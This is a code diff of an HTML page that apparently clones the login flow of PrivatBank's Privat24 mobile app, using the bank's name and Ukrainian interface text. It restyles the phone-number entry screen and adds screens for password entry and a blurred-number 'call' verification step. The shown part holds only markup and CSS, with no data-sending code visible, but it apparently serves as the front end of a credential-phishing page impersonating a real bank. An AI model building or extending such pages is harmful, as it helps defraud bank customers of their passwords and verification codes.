@@ -3,588 +3,238 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Вхід/Реєстрація</title>
+<title>Приват24</title>
 <style>
-* { 
-  margin: 0; 
-  padding: 0; 
-  box-sizing: border-box; 
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
-  -webkit-tap-highlight-color: transparent; 
-}
+* { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
 
 :root {
-  --bg: #121212;
-  --surface: #1e1e1e;
-  --surface-input: #2a2a2a;
+  --bg: #141414;
+  --surface: #202020;
+  --surface-input: #2d2d2d;
   --accent: #5cc12c;
   --accent-hover: #4da824;
-  --text: #ffffff;
-  --text-muted: #888888;
-  --border: #333333;
-  --icon-bg: #2a2a2a;
+  --text: #f5f5f5;
+  --text-muted: #999999;
+  --border: #3a3a3a;
+  --icon-bg: #2d2d2d;
 }
 
-body { 
-  background-color: var(--bg); 
-  color: var(--text); 
-  min-height: 100vh; 
-  display: flex; 
-  flex-direction: column;
-  overflow-x: hidden; 
-}
+body { background-color: var(--bg); color: var(--text); min-height: 100vh; overflow: hidden; }
 
-/* Шапка */
-.header {
-  display: flex; 
-  align-items: center; 
-  justify-content: space-between;
-  padding: 16px;
-  background: var(--bg);
-  position: sticky; 
-  top: 0; 
-  z-index: 10;
-  height: 60px;
-}
-.header .menu, .header .support {
-  width: 24px; 
-  height: 24px; 
-  cursor: pointer;
-  display: flex; 
-  align-items: center; 
-  justify-content: center;
-}
-.header .title { 
-  font-size: 20px; 
-  font-weight: 500; 
-}
+/* ЭКРАНЫ */
+.screen { display: none; flex-direction: column; height: 100vh; width: 100%; position: absolute; top: 0; left: 0; background: var(--bg); z-index: 1; }
+.screen.active { display: flex; }
+.screen.call-screen { background: #1a1b1d; z-index: 100; }
 
-/* Обертка для прокрутки контента */
-.content-wrapper {
-  flex: 1;
-  overflow-y: auto;
-  padding: 16px;
-  padding-bottom: 100px; /* Отступ под нижнее меню */
-}
+/* ШАПКА ГЛАВНАЯ */
+.header { display: flex; align-items: center; justify-content: space-between; padding: 16px; background: var(--bg); flex-shrink: 0; height: 60px; }
+.header .menu, .header .support { width: 24px; height: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+.header .title { font-size: 20px; font-weight: 500; }
 
-/* Блок авторизации */
-.auth-card {
-  background: var(--surface);
-  border-radius: 16px;
-  padding: 20px;
-  margin-bottom: 24px;
-}
-.auth-card h3 { 
-  font-size: 15px; 
-  font-weight: 400; 
-  margin-bottom: 12px; 
-  color: #ccc;
-}
+/* КОНТЕНТ ГЛАВНЫЙ */
+.main-content { padding: 0 16px 90px 16px; flex: 1; overflow-y: auto; }
+.auth-card { background: var(--surface); border-radius: 12px; padding: 20px; margin-bottom: 24px; }
+.auth-card h3 { font-size: 16px; font-weight: 400; margin-bottom: 16px; }
 
-/* Ввод телефона */
-.phone-input-group {
-  display: flex;
-  margin-bottom: 16px;
-  width: 100%;
-}
-.country-code {
-  display: flex; 
-  align-items: center; 
-  gap: 8px;
-  background: #252525;
-  border: 1px solid var(--border);
-  border-radius: 8px 0 0 8px;
-  padding: 0 12px;
-  font-size: 16px;
-  border-right: none;
-  flex-shrink: 0;
-}
-.flag { 
-  width: 20px; 
-  height: 14px; 
-  background: linear-gradient(to bottom, #0057b7 50%, #ffd700 50%); 
-  border-radius: 2px; 
-}
-.phone-input {
-  flex: 1;
-  width: 100%;
-  background: var(--surface-input);
-  border: 1px solid var(--border);
-  border-radius: 0 8px 8px 0;
-  padding: 14px 16px;
-  color: var(--text);
-  font-size: 16px;
-  outline: none;
-  min-width: 0;
-}
-.phone-input::placeholder { 
-  color: var(--text-muted); 
-}
+.phone-input-group { display: flex; margin-bottom: 16px; }
+.country-code { display: flex; align-items: center; gap: 6px; background: #252525; border: 1px solid var(--border); border-radius: 8px 0 0 8px; padding: 0 12px; font-size: 16px; border-right: none; }
+.flag { width: 20px; height: 14px; background: linear-gradient(to bottom, #0057b7 50%, #ffd700 50%); border-radius: 2px; }
+.phone-input { flex: 1; background: var(--surface-input); border: 1px solid var(--border); border-radius: 0 8px 8px 0; padding: 14px 16px; color: var(--text); font-size: 16px; outline: none; }
 
-/* Чекбокс */
-.checkbox-container {
-  display: flex; 
-  align-items: flex-start; 
-  gap: 12px;
-  margin-bottom: 24px;
-  font-size: 14px; 
-  line-height: 1.4;
-  cursor: pointer;
-}
-.custom-checkbox {
-  width: 24px; 
-  height: 24px;
-  background-color: var(--accent);
-  border-radius: 4px;
-  display: flex; 
-  align-items: center; 
-  justify-content: center;
-  flex-shrink: 0;
-  margin-top: 2px;
-}
-.custom-checkbox svg { 
-  width: 16px; 
-  height: 16px; 
-  stroke: white; 
-  stroke-width: 3; 
-  fill: none; 
-}
-.checkbox-text { 
-  color: #ccc; 
-}
-.checkbox-text a { 
-  color: var(--accent); 
-  text-decoration: underline; 
-}
+.checkbox-container { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 20px; font-size: 14px; line-height: 1.4; }
+.custom-checkbox { width: 24px; height: 24px; background-color: var(--accent); border-radius: 4px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; cursor: pointer; margin-top: 2px; }
+.custom-checkbox svg { width: 16px; height: 16px; stroke: white; stroke-width: 3; fill: none; }
+.checkbox-text { color: #e0e0e0; }
+.checkbox-text a { color: var(--accent); text-decoration: underline; }
 
-/* Кнопка Продовжити */
-.btn-primary {
-  width: 100%;
-  background: var(--accent);
-  color: white;
-  border: none;
-  border-radius: 8px;
-  padding: 16px;
-  font-size: 16px;
-  font-weight: 500;
-  cursor: pointer;
-  transition: background 0.2s;
-}
-.btn-primary:hover { 
-  background: var(--accent-hover); 
-}
+.btn-primary { width: 100%; background: var(--accent); color: white; border: none; border-radius: 8px; padding: 16px; font-size: 16px; font-weight: 500; cursor: pointer; }
+.btn-primary:hover { background: var(--accent-hover); }
 
-/* Быстрые действия */
-.quick-actions {
-  display: flex; 
-  justify-content: space-around;
-  margin-bottom: 24px;
-  padding: 0 10px;
-}
-.action-item {
-  display: flex; 
-  flex-direction: column; 
-  align-items: center; 
-  gap: 8px;
-  cursor: pointer;
-}
-.action-icon {
-  width: 64px; 
-  height: 64px;
-  background: var(--icon-bg);
-  border-radius: 50%;
-  display: flex; 
-  align-items: center; 
-  justify-content: center;
-}
-.action-icon svg { 
-  width: 28px; 
-  height: 28px; 
-  fill: #ccc; 
-}
-.action-label { 
-  font-size: 13px; 
-  color: var(--text); 
-}
+.quick-actions { display: flex; justify-content: space-between; margin-bottom: 32px; padding: 0 10px; }
+.action-item { display: flex; flex-direction: column; align-items: center; gap: 8px; cursor: pointer; }
+.action-icon { width: 64px; height: 64px; background: var(--icon-bg); border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+.action-icon svg { width: 28px; height: 28px; fill: #ccc; }
+.action-label { font-size: 13px; color: var(--text); }
 
-/* Промо карта */
-.promo-card {
-  background: var(--surface);
-  border-radius: 16px;
-  padding: 32px 20px;
-  text-align: center;
-}
-.card-image {
-  width: 140px; 
-  height: 85px;
-  background: linear-gradient(135deg, #5a7ca8, #2b4162);
-  border-radius: 10px;
-  margin: 0 auto 20px;
-  box-shadow: 0 4px 12px rgba(0,0,0,0.4);
-  position: relative;
-}
-.card-image::after {
-  content: ''; 
-  position: absolute; 
-  top: 12px; 
-  right: 12px;
-  width: 24px; 
-  height: 18px; 
-  background: rgba(255,255,255,0.2); 
-  border-radius: 4px;
-}
-.promo-card h3 { 
-  font-size: 18px; 
-  font-weight: 500; 
-  margin-bottom: 8px; 
-}
-.promo-card p { 
-  font-size: 13px; 
-  color: var(--text-muted); 
-  margin-bottom: 24px; 
-}
-.btn-secondary {
-  width: 100%;
-  background: #333;
-  color: white;
-  border: none;
-  border-radius: 8px;
-  padding: 16px;
-  font-size: 16px;
-  font-weight: 500;
-  cursor: pointer;
-}
+.promo-card { background: var(--surface); border-radius: 12px; padding: 32px 20px; text-align: center; margin-bottom: 24px; }
+.card-image { width: 120px; height: 75px; background: linear-gradient(135deg, #4a6fa5, #2b4162); border-radius: 8px; margin: 0 auto 16px; box-shadow: 0 4px 12px rgba(0,0,0,0.3); position: relative; }
+.card-image::after { content: ''; position: absolute; top: 10px; right: 10px; width: 20px; height: 15px; background: rgba(255,255,255,0.2); border-radius: 2px; }
+.promo-card h3 { font-size: 18px; font-weight: 500; margin-bottom: 8px; }
+.promo-card p { font-size: 13px; color: var(--text-muted); margin-bottom: 24px; }
+.btn-secondary { width: 100%; background: #3a3a3a; color: white; border: none; border-radius: 8px; padding: 16px; font-size: 16px; font-weight: 500; cursor: pointer; }
 
-/* Плавающая кнопка QR */
-.fab-qr {
-  position: fixed;
-  bottom: 90px; 
-  right: 16px;
-  width: 56px; 
-  height: 56px;
-  background: #2a2a2a;
-  border: 2px solid #444;
-  border-radius: 16px;
-  display: flex; 
-  align-items: center; 
-  justify-content: center;
-  cursor: pointer;
-  z-index: 20;
-  box-shadow: 0 4px 12px rgba(0,0,0,0.5);
-}
-.fab-qr svg { 
-  width: 28px; 
-  height: 28px; 
-  fill: white; 
-}
+.fab-qr { position: absolute; bottom: 100px; right: 20px; width: 56px; height: 56px; background: #2d2d2d; border: 2px solid #444; border-radius: 16px; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 20; box-shadow: 0 4px 12px rgba(0,0,0,0.5); }
+.fab-qr svg { width: 28px; height: 28px; fill: white; }
 
-/* Нижняя навигация */
-.bottom-nav {
-  position: fixed; 
-  bottom: 0; 
-  left: 0; 
-  right: 0;
-  background: var(--bg);
-  display: flex; 
-  justify-content: space-around;
-  padding: 12px 0 24px;
-  border-top: 1px solid #222;
-  z-index: 30;
-}
-.nav-item {
-  display: flex; 
-  flex-direction: column; 
-  align-items: center; 
-  gap: 4px;
-  cursor: pointer; 
-  color: var(--text-muted);
-  font-size: 11px;
-}
-.nav-item.active { 
-  color: var(--accent); 
-}
-.nav-item svg { 
-  width: 24px; 
-  height: 24px; 
-  fill: currentColor; 
-}
+.bottom-nav { position: absolute; bottom: 0; left: 0; right: 0; background: var(--bg); display: flex; justify-content: space-around; padding: 12px 0 24px; border-top: 1px solid #222; z-index: 30; }
+.nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; color: var(--text-muted); font-size: 11px; }
+.nav-item.active { color: var(--accent); }
+.nav-item svg { width: 24px; height: 24px; fill: currentColor; }
 
-/* Экран звонка */
-#callScreen {
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: #1a1b1d;
-  z-index: 100;
-  display: none;
-  flex-direction: column;
-  padding: 16px;
-}
-.call-header {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  height: 50px;
-}
-.call-header .title {
-  font-size: 20px;
-  font-weight: 500;
-  margin: 0 auto;
-  padding-left: 24px; /* Балансировка под крестик */
-}
-.close-btn {
-  width: 24px;
-  height: 24px;
-  cursor: pointer;
-}
-.call-content {
-  flex: 1;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  padding-top: 20px;
-}
-.call-phone-label {
-  width: 100%;
-  text-align: left;
-  font-size: 13px;
-  color: var(--text-muted);
-  margin-bottom: 8px;
-}
-.call-phone-display {
-  width: 100%;
-  font-size: 16px;
-  background: #26272b;
-  padding: 14px 16px;
-  border-radius: 8px;
-  letter-spacing: 1px;
-  filter: blur(1.5px);
-  user-select: none;
-  margin-bottom: 30px;
-}
-.call-bank-title {
-  font-size: 15px;
-  color: #ccc;
-  margin-bottom: 40px;
-}
+/* ЭКРАН ПАРОЛЯ */
+.pwd-header { display: flex; align-items: center; padding: 16px; height: 60px; flex-shrink: 0; }
+.pwd-header .back-btn { width: 24px; height: 24px; cursor: pointer; margin-right: 16px; display: flex; align-items: center; justify-content: center; }
+.pwd-header .back-btn svg { fill: var(--text); }
+.pwd-header .title { font-size: 20px; font-weight: 500; }
 
-.call-circle-container {
-  position: relative;
-  width: 140px;
-  height: 140px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  margin-bottom: 30px;
-}
-.call-circle-bg {
-  position: absolute;
-  width: 100%;
-  height: 100%;
-  border-radius: 50%;
-  border: 4px solid #333;
-  border-top-color: var(--accent);
-  border-right-color: var(--accent);
-  transform: rotate(-45deg);
-  animation: spin 2s linear infinite;
-}
-@keyframes spin {
-  0% { transform: rotate(-45deg); }
-  100% { transform: rotate(315deg); }
-}
-.call-icon {
-  width: 80px;
-  height: 80px;
-  background: #2a2b2f;
-  border-radius: 50%;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  z-index: 1;
-}
-.call-icon svg {
-  width: 40px;
-  height: 40px;
-  fill: var(--accent);
-}
-.call-instruction {
-  font-size: 16px;
-  line-height: 1.4;
-  color: #e0e0e0;
-  margin-bottom: 40px;
-  max-width: 280px;
-  text-align: center;
-}
-.btn-sms {
-  background: transparent;
-  color: var(--accent);
-  border: none;
-  font-size: 16px;
-  font-weight: 500;
-  cursor: pointer;
-  padding: 10px;
-  margin-bottom: 20px;
-}
-.bottom-indicator {
-  width: 100%;
-  height: 4px;
-  background: #333;
-  border-radius: 2px;
-  position: relative;
-}
-.bottom-indicator::before {
-  content: '';
-  position: absolute;
-  left: 0;
-  top: 0;
-  height: 100%;
-  width: 40%;
-  background: var(--accent);
-  border-radius: 2px;
-}
+.pwd-content { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px 24px; overflow-y: auto; }
+.logo-container { position: relative; width: 120px; height: 120px; display: flex; align-items: center; justify-content: center; margin-top: 20px; margin-bottom: 30px; flex-shrink: 0; }
+.bg-spot { position: absolute; background: rgba(92, 193, 44, 0.05); border-radius: 50%; filter: blur(20px); }
+.spot-1 { width: 80px; height: 80px; top: 0; left: 0; background: rgba(92, 193, 44, 0.1); }
+.spot-2 { width: 70px; height: 70px; bottom: 0; right: 0; background: rgba(255, 255, 255, 0.03); }
+.circle-24 { width: 75px; height: 75px; border-radius: 50%; border: 1.5px solid #888; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: 300; color: var(--text); z-index: 1; background: #141414; }
+.subtitle { font-size: 15px; color: #ccc; margin-bottom: 30px; text-align: center; flex-shrink: 0; }
+
+.input-group { width: 100%; position: relative; margin-bottom: 30px; flex-shrink: 0; }
+.input-label { font-size: 13px; color: var(--accent); margin-bottom: 8px; display: block; }
+.input-wrapper { position: relative; border-bottom: 1px solid var(--accent); display: flex; align-items: center; }
+.password-input { width: 100%; background: transparent; border: none; padding: 8px 0; color: var(--text); font-size: 16px; outline: none; letter-spacing: 2px; }
+.eye-icon { position: absolute; right: 0; cursor: pointer; width: 24px; height: 24px; display: flex; align-items: center; justify-content: center; }
+.eye-icon svg { fill: #888; }
+
+.btn-pwd-submit { width: 100%; background: var(--accent); color: white; border: none; border-radius: 8px; padding: 16px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: auto; margin-bottom: 20px; flex-shrink: 0; }
+
+/* ЭКРАН ЗВОНКА */
+.call-header { display: flex; align-items: center; justify-content: center; padding: 16px; position: relative; height: 60px; flex-shrink: 0; }
+.call-header .close-btn { position: absolute; right: 16px; width: 24px; height: 24px; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+.call-header .close-btn svg { width: 24px; height: 24px; fill: #ffffff; }
+.call-header .title { font-size: 20px; font-weight: 500; color: #fff; }
+
+.call-content { padding: 0 24px 30px 24px; flex: 1; display: flex; flex-direction: column; align-items: center; text-align: center; overflow-y: auto; }
+.call-phone-info { width: 100%; text-align: left; margin-bottom: 30px; margin-top: 10px; }
+.call-phone-label { font-size: 13px; color: #888; margin-bottom: 8px; }
+.call-phone-display { font-size: 16px; color: #fff; background: #333438; padding: 12px 16px; border-radius: 8px; letter-spacing: 1px; filter: blur(1.5px); user-select: none; }
+.call-bank-title { font-size: 15px; color: #cccccc; margin-bottom: 30px; }
+
+.call-circle-container { position: relative; width: 140px; height: 140px; display: flex; align-items: center; justify-content: center; margin-bottom: 30px; }
+.call-circle-bg { position: absolute; width: 100%; height: 100%; border-radius: 50%; border: 3px solid #333; border-top-color: var(--accent); border-right-color: var(--accent); transform: rotate(-45deg); animation: spin 2s linear infinite; }
+@keyframes spin { 0% { transform: rotate(-45deg); } 100% { transform: rotate(315deg); } }
+.call-icon { width: 70px; height: 70px; background: #2a2b2f; border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 1; }
+.call-icon svg { width: 40px; height: 40px; fill: var(--accent); }
+
+.call-instruction { font-size: 15px; line-height: 1.5; color: #e0e0e0; margin-bottom: 30px; max-width: 280px; }
+.btn-sms { background: transparent; color: var(--accent); border: none; font-size: 15px; font-weight: 500; cursor: pointer; padding: 10px; margin-bottom: 20px; }
+.call-bottom-indicator { width: 100%; height: 4px; background: #333; border-radius: 2px; position: relative; flex-shrink: 0; }
+.call-bottom-indicator::before { content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 40%; background: var(--accent); border-radius: 2px; }
 </style>
 </head>
 <body>
 
-<!-- Основной экран -->
-<div id="mainScreen" style="display: flex; flex-direction: column; height: 100vh;">
-  <!-- Шапка -->
+<!-- ЭКРАН 1: ВВОД ТЕЛЕФОНА -->
+<div id="screen-phone" class="screen active">
   <header class="header">
-    <div class="menu">
-      <svg width="24" height="24" fill="none" viewBox="0 0 24 24"><path d="M4 7c-.28 0-.52-.1-.71-.29A.973.973 0 013 6c0-.28.1-.52.29-.71C3.48 5.1 3.72 5 4 5h16c.28 0 .52.1.71.29.19.19.29.43.29.71 0 .28-.1.52-.29.71-.19.19-.43.29-.71.29H4zm0 12c-.28 0-.52-.1-.71-.29A.973.973 0 013 18c0-.28.1-.52.29-.71.19-.19.43-.29.71-.29h16c.28 0 .52.1.71.29.19.19.29.43.29.71 0 .28-.1.52-.29.71-.19.19-.43.29-.71.29H4zm0-6c-.28 0-.52-.1-.71-.29A.973.973 0 013 12c0-.28.1-.52.29-.71.19-.19.43-.29.71-.29h16c.28 0 .52.1.71.29.19.19.29.43.29.71 0 .28-.1.52-.29.71-.19.19-.43.29-.71.29H4z" fill="#FFF"/></svg>
-    </div>
+    <div class="menu"><svg width="24" height="24" fill="none" viewBox="0 0 24 24"><path d="M4 7c-.28 0-.52-.1-.71-.29A.973.973 0 013 6c0-.28.1-.52.29-.71C3.48 5.1 3.72 5 4 5h16c.28 0 .52.1.71.29.19.19.29.43.29.71 0 .28-.1.52-.29.71-.19.19-.43.29-.71.29H4zm0 12c-.28 0-.52-.1-.71-.29A.973.973 0 013 18c0-.28.1-.52.29-.71.19-.19.43-.29.71-.29h16c.28 0 .52.1.71.29.19.19.29.43.29.71 0 .28-.1.52-.29.71-.19.19-.43.29-.71.29H4zm0-6c-.28 0-.52-.1-.71-.29A.973.973 0 013 12c0-.28.1-.52.29-.71.19-.19.43-.29.71-.29h16c.28 0 .52.1.71.29.19.19.29.43.29.71 0 .28-.1.52-.29.71-.19.19-.43.29-.71.29H4z" fill="#FFF"/></svg></div>
     <div class="title">Вхід/Реєстрація</div>
-    <div class="support">
-      <svg width="24" height="24" fill="none" viewBox="0 0 24 24"><path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1.5-6.5h3v1.5h-3v-1.5zm0-2h3v-1c0-1.5-1-2.5-2-3-1-.5-1.5-1.5-1.5-2.5 0-1.1.9-2 2-2s2 .9 2 2h2c0-2.2-1.8-4-4-4s-4 1.8-4 4c0 1.5 1 2.5 2 3 1 .5 1.5 1.5 1.5 2.5v1z" fill="#FFF"/></svg>
-    </div>
+    <div class="support"><svg width="24" height="24" fill="none" viewBox="0 0 24 24"><path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1.5-6.5h3v1.5h-3v-1.5zm0-2h3v-1c0-1.5-1-2.5-2-3-1-.5-1.5-1.5-1.5-2.5 0-1.1.9-2 2-2s2 .9 2 2h2c0-2.2-1.8-4-4-4s-4 1.8-4 4c0 1.5 1 2.5 2 3 1 .5 1.5 1.5 1.5 2.5v1z" fill="#FFF"/></svg></div>
   </header>
 
-  <!-- Скролл-контент -->
-  <div class="content-wrapper">
-    <!-- Блок авторизации -->
+  <main class="main-content">
     <div class="auth-card">
       <h3>Номер телефону</h3>
       <div class="phone-input-group">
-        <div class="country-code">
-          <div class="flag"></div>
-          <span>+380</span>
-        </div>
+        <div class="country-code"><div class="flag"></div><span>+380</span></div>
         <input type="tel" id="phoneInput" class="phone-input" placeholder="00 000 00 00" maxlength="13">
       </div>
-
       <label class="checkbox-container">
-        <div class="custom-checkbox">
-          <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
-        </div>
-        <div class="checkbox-text">
-          Я підтверджую, що ознайомлений(-на) з <a href="#">Умовами та Правилами</a>, та даю згоду на <a href="#">обробку моїх персональних даних у Банку</a>
-        </div>
+        <div class="custom-checkbox"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg></div>
+        <div class="checkbox-text">Я підтверджую, що ознайомлений(-на) з <a href="#">Умовами та Правилами</a>, та даю згоду на <a href="#">обробку моїх персональних даних у Банку</a></div>
       </label>
-
       <button class="btn-primary" id="continueBtn">Продовжити</button>
     </div>
 
-    <!-- Быстрые действия -->
     <div class="quick-actions">
-      <div class="action-item">
-        <div class="action-icon">
-          <svg viewBox="0 0 24 24"><path d="M9.18 12.94a.91.91 0 01-.67-.27.91.91 0 01-.27-.67V6.196L6.478 7.958a.877.877 0 01-.646.259.958.958 0 01-.67-.259.915.915 0 01-.282-.67c0-.258.094-.481.282-.67l3.36-3.36a.824.824 0 01.306-.2C8.938 3.02 9.055 3 9.18 3c.125 0 .243.02.353.059.11.039.211.105.305.2l3.384 3.383a.861.861 0 01.27.658.946.946 0 01-.294.658.991.991 0 01-.658.27.861.861 0 01-.657-.27L10.12 6.196V12a.91.91 0 01-.27.67.91.91 0 01-.67.27zM14.82 21c-.126 0-.243-.02-.353-.059a.825.825 0 01-.305-.2l-3.384-3.383a.861.861 0 01-.27-.658.946.946 0 01.294-.658.992.992 0 01.658-.27c.25-.008.47.082.657.27l1.763 1.762V12c0-.266.09-.49.27-.67a.91.91 0 01.67-.27c.266 0 .49.09.67.27.18.18.27.404.27.67v5.804l1.762-1.762a.877.877 0 01.646-.259c.259 0 .482.087.67.259a.915.915 0 01.282.67.915.915 0 01-.282.67l-3.36 3.36a.825.825 0 01-.306.2c-.11.038-.227.058-.352.058z"/></svg>
-        </div>
-        <div class="action-label">Переказати</div>
-      </div>
-      <div class="action-item">
-        <div class="action-icon">
-          <svg viewBox="0 0 24 24"><path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 18H7V5h10v14z"/></svg>
-        </div>
-        <div class="action-label">Мобільний</div>
-      </div>
-      <div class="action-item">
-        <div class="action-icon">
-          <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
-        </div>
-        <div class="action-label">Платежі</div>
-      </div>
+      <div class="action-item"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M9.18 12.94a.91.91 0 01-.67-.27.91.91 0 01-.27-.67V6.196L6.478 7.958a.877.877 0 01-.646.259.958.958 0 01-.67-.259.915.915 0 01-.282-.67c0-.258.094-.481.282-.67l3.36-3.36a.824.824 0 01.306-.2C8.938 3.02 9.055 3 9.18 3c.125 0 .243.02.353.059.11.039.211.105.305.2l3.384 3.383a.861.861 0 01.27.658.946.946 0 01-.294.658.991.991 0 01-.658.27.861.861 0 01-.657-.27L10.12 6.196V12a.91.91 0 01-.27.67.91.91 0 01-.67.27zM14.82 21c-.126 0-.243-.02-.353-.059a.825.825 0 01-.305-.2l-3.384-3.383a.861.861 0 01-.27-.658.946.946 0 01.294-.658.992.992 0 01.658-.27c.25-.008.47.082.657.27l1.763 1.762V12c0-.266.09-.49.27-.67a.91.91 0 01.67-.27c.266 0 .49.09.67.27.18.18.27.404.27.67v5.804l1.762-1.762a.877.877 0 01.646-.259c.259 0 .482.087.67.259a.915.915 0 01.282.67.915.915 0 01-.282.67l-3.36 3.36a.825.825 0 01-.306.2c-.11.038-.227.058-.352.058z"/></svg></div><div class="action-label">Переказати</div></div>
+      <div class="action-item"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 18H7V5h10v14z"/></svg></div><div class="action-label">Мобільний</div></div>
+      <div class="action-item"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg></div><div class="action-label">Платежі</div></div>
     </div>
 
-    <!-- Промо карта -->
     <div class="promo-card">
       <div class="card-image"></div>
       <h3>Картки від ПриватБанку</h3>
       <p>Безкоштовний випуск. Доставка по Україні та світу</p>
       <button class="btn-secondary">Відкрити картку</button>
     </div>
-  </div>
+  </main>
 
-  <!-- Плавающая кнопка QR -->
-  <div class="fab-qr">
-    <svg viewBox="0 0 24 24"><path d="M3 11h8V3H3v8zm2-6h4v4H5V5zM3 21h8v-8H3v8zm2-6h4v4H5v-4zM13 3v8h8V3h-8zm6 6h-4V5h4v4zM13 13h2v2h-2zM15 15h2v2h-2zM17 13h2v2h-2zM13 17h2v2h-2zM15 19h2v2h-2zM19 15h2v2h-2zM17 19h2v2h-2zM19 19h2v2h-2zM19 17h2v2h-2zM17 17h2v2h-2z"/></svg>
-  </div>
+  <div class="fab-qr"><svg viewBox="0 0 24 24"><path d="M3 11h8V3H3v8zm2-6h4v4H5V5zM3 21h8v-8H3v8zm2-6h4v4H5v-4zM13 3v8h8V3h-8zm6 6h-4V5h4v4zM13 13h2v2h-2zM15 15h2v2h-2zM17 13h2v2h-2zM13 17h2v2h-2zM15 19h2v2h-2zM19 15h2v2h-2zM17 19h2v2h-2zM19 19h2v2h-2zM19 17h2v2h-2zM17 17h2v2h-2z"/></svg></div>
 
-  <!-- Нижняя навигация -->
   <nav class="bottom-nav">
-    <div class="nav-item active">
-      <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
-      <span>Головний</span>
-    </div>
-    <div class="nav-item">
-      <svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
-      <span>Кредити</span>
-    </div>
-    <div class="nav-item">
-      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg>
-      <span>Конверти</span>
-    </div>
-    <div class="nav-item">
-      <svg viewBox="0 0 24 24"><path d="M12.06 19.5c-.84 0-1.54-.28-2.1-.84-.56-.56-.84-1.26-.84-2.1 0-.14.01-.29.04-.43-.14.03-.29.04-.43.04-.84 0-1.54-.28-2.1-.84-.56-.56-.84-1.26-.84-2.1 0-.84.28-1.54.84-2.1.56-.56 1.26-.84 2.1-.84.14 0 .29.01.43.04-.03-.14-.04-.29-.04-.43 0-.84.28-1.54.84-2.1.56-.56 1.26-.84 2.1-.84.84 0 1.54.28 2.1.84.56.56.84 1.26.84 2.1 0 .14-.01.29-.04.43.14-.03.29-.04.43-.04.84 0 1.54.28 2.1.84.56.56.84 1.26.84 2.1 0 .84-.28 1.54-.84 2.1-.56.56-1.26.84-2.1.84-.14 0-.29-.01-.43-.04.03.14.04.29.04.43 0 .84-.28 1.54-.84 2.1-.56.56-1.26.84-2.1.84z"/></svg>
-      <span>Привіт</span>
-    </div>
-    <div class="nav-item">
-      <svg viewBox="0 0 24 24"><path d="M4 4h6v6H4V4zm10 0h6v6h-6V4zM4 14h6v6H4v-6zm10 0h6v6h-6v-6z"/></svg>
-      <span>Ще</span>
-    </div>
+    <div class="nav-item active"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span>Головний</span></div>
+    <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg><span>Кредити</span></div>
+    <div class="nav-item"><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14.5v-9l6 4.5-6 4.5z"/></svg><span>Конверти</span></div>
